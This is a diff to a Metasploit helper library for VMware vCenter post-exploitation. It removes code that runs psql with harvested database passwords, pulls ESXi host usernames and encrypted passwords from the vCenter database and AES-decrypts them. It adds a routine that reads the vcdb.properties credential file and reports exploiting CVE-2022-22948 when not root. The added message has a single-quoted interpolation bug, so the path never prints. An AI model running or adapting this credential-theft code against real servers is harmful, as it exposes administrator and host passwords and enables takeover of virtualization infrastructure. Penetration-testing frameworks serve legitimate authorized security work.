@@ -5,6 +5,7 @@ module Msf
     module Vcenter
       module Vcenter
         include Msf::Post::File
+        include Msf::Post::Linux::Priv
 
         def manifest_file
           '/opt/vmware/etc/appliance-manifest.xml'
@@ -44,6 +45,10 @@ module Msf
 
         def psql_bin
           '/opt/vmware/vpostgres/current/bin/psql'
+        end
+
+        def vcd_properties_file
+          '/etc/vmware-vpx/vcdb.properties'
         end
 
         #
@@ -349,159 +354,21 @@ module Msf
         end
 
         #
-        # A helper function to return the command line statement string to connect to the postgress server
-        # @param pg_password [String] postgress password
-        # @param vcdb_user [String] virtual center database username
-        # @param vcdb_name [String] virtual center database name
-        # @param vcdb_host [String] virtual center hostname. Defaults to 'localhost'
-        # @return [String] a string to run on command line
-        #
-        def postgress_connect(pg_password, vcdb_user, vcdb_name, vcdb_host = 'localhost')
-          # should come in wrapped in quotes, but if not wrap
-          unless pg_password.start_with?("'") && pg_password.end_with?("'")
-            pg_password = "'#{pg_password}'"
-          end
-          "PGPASSWORD=#{pg_password} #{psql_bin} -h '#{vcdb_host}' -U '#{vcdb_user}' -d '#{vcdb_name}'"
-        end
-
-        #
-        # Returns a list of vpc customization contents
-        # @param pg_password [String] postgress password
-        # @param vcdb_user [String] virtual center database username
-        # @param vcdb_name [String] virtual center database name
-        # @return [Hash] where the customization name is the key and value is the parsed xml doc, nil on error
-        #
-        def get_vpx_customization_spec(pg_password, vcdb_user, vcdb_name)
-          return nil unless command_exists? psql_bin
-
-          output = {}
-          vpx_customization_specs = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT DISTINCT name FROM vc.vpx_customization_spec;' -P pager -A -t")
-          return nil if vpx_customization_specs.nil?
-
-          vpx_customization_specs = vpx_customization_specs.split("\n")
-          return nil unless vpx_customization_specs.first
-
-          vpx_customization_specs.each do |spec|
-            xml = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t").to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
-            next if xml.nil?
-
-            begin
-              xmldoc = Nokogiri::XML(xml) do |config|
-                config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
-              end
-            rescue Nokogiri::XML::SyntaxError
-              print_bad("Unable to read XML from #{spec}")
-              next
-            end
-            output[spec] = xmldoc
-          end
-          output
-        end
-
-        #
-        # helper function to decrypt passwords stored in the pg database
-        # @param b64 [String] base64 string of the password exported from postgres
-        # @param vc_sym_key [String] sym key from virtual center
-        # @return [String] the decrypted password, nil on error
-
-        def vpx_aes_decrypt(b64, vc_sym_key)
-          # https://www.pentera.io/wp-content/uploads/2022/03/Sensitive-Information-Disclosure_VMware-vCenter_f.pdf
-          secret_bytes = Base64.strict_decode64(b64)
-          iv = secret_bytes[0, 16]
-          ciphertext = secret_bytes[16, 64]
-          decipher = OpenSSL::Cipher.new('aes-256-cbc')
-          decipher.decrypt
-          decipher.iv = iv
-          decipher.padding = 1
-          decipher.key = vc_sym_key
-          return (decipher.update(ciphertext) + decipher.final).delete("\000")
-        rescue StandardError => e
-          elog('Error performing vpx_aes_decrypt', error: e)
-          ''
-        end
-
-        #
-        # Returns a list of vpc customization contents
-        # @param pg_password [String] postgress password
-        # @param vcdb_user [String] virtual center database username
-        # @param vcdb_name [String] virtual center database name
-        # @param vc_sym_key [String] sym key from virtual center
-        # @return [Array] list of hash tables where each table is a user, nil on error
-        #
-        def get_vpx_users(pg_password, vcdb_user, vcdb_name, vc_sym_key)
-          return nil unless command_exists? psql_bin
-
-          output = []
-          vpxuser_rows = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host ORDER BY dns_name ASC;' -P pager -A -t")
-          return nil if vpxuser_rows.nil?
-
-          vpxuser_rows = vpxuser_rows.split("\n")
-          return nil unless vpxuser_rows.first
-
-          vpxuser_rows.each do |vpxuser_row|
-            row_data = vpxuser_row.split('|')
-            next if row_data.length < 4 # shoudld always be 4 based on query, but this will catch 'command not found' or other things like that
-
-            user = {
-              'fqdn' => row_data[0],
-              'ip' => row_data[1],
-              'user' => row_data[2]
-            }
-
-            vpxuser_secret_b64 = row_data[3].gsub('*', '')
-            user['password'] = vpx_aes_decrypt(vpxuser_secret_b64, vc_sym_key).gsub('\"', '"')
-            output.append(user)
-          end
-          output
-        end
-
-        #
-        # Returns a list of virtual machines located on the server
-        # @param pg_password [String] postgress password
-        # @param vcdb_user [String] virtual center database username
-        # @param vcdb_name [String] virtual center database name
-        # @param vc_sym_key [String] sym key from virtual center
-        # @return [Array] list of hash tables where each table is a user, nil on error
-        #
-        def get_vpx_vms(pg_password, vcdb_user, vcdb_name, _vc_sym_key)
-          return nil unless command_exists? psql_bin
-
-          output = []
-          vm_rows = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT vmid, name, configfilename, guest_state, is_template FROM vpxv_vms;' -P pager -A -t")
-          return nil if vm_rows.nil?
-
-          vm_rows = vm_rows.split("\n")
-          return nil unless vm_rows.first
-
-          vm_rows.each do |vm_row|
-            row_data = vm_row.split('|')
-            next if row_data.length < 5 # shoudld always be 5 based on query, but this will catch 'command not found' or other things like that
-
-            vm = {
-              'vmid' => row_data[0],
-              'name' => row_data[1],
-              'configfilename' => row_data[3],
-              'guest_state' => row_data[4],
-              'is_template' => row_data[5]
-            }
-            output.append(vm)
-          end
-          output
-        end
-
-        #
         # Returns a hash table of the vcdb.properties file
         # @param location [String] where the file is located. defaults to /etc/vmware-vpx/vcdb.properties
         # @return [Hash] hash of the file contents, nil on error
         #
-        def process_vcdb_properties_file(location = '/etc/vmware-vpx/vcdb.properties')
+        def process_vcdb_properties_file(location = vcd_properties_file)
           return nil unless file_exist?(location)
 
           contents = read_file(location)
           return nil if contents.nil?
 
+          if location == vcd_properties_file && is_root? == false
+            print_good('Exploited CVE-2022-22948 to read #{vcd_properties_file}')
+          end
           output = {}
-          contents.split("\n").each do |line|
+          contents.each_line(chomp: true) do |line|
             next unless line.include?('=') # attempt to do a little quality control
 
             line = line.split('=')
